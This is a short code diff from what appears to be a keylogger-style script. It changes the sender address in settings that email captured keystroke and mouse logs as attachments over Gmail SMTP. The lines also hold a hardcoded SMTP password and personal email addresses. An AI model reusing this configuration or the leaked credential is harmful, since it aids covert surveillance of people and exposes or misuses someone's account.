@@ -20,7 +20,7 @@ keyandmouse_folder = 'key_mouse_logs'
 
 smtp_port = 587
 smtp_server = "smtp.gmail.com"
-email_from = "rohitbarik194@gmail.com"
+email_from = "medhaacharya248@gmail.com"
 email_list = ["rohitbarik48@gmail.com"]
 pswd = "fzbo szkt fwdf eaqe"
 subject = "Attachments"
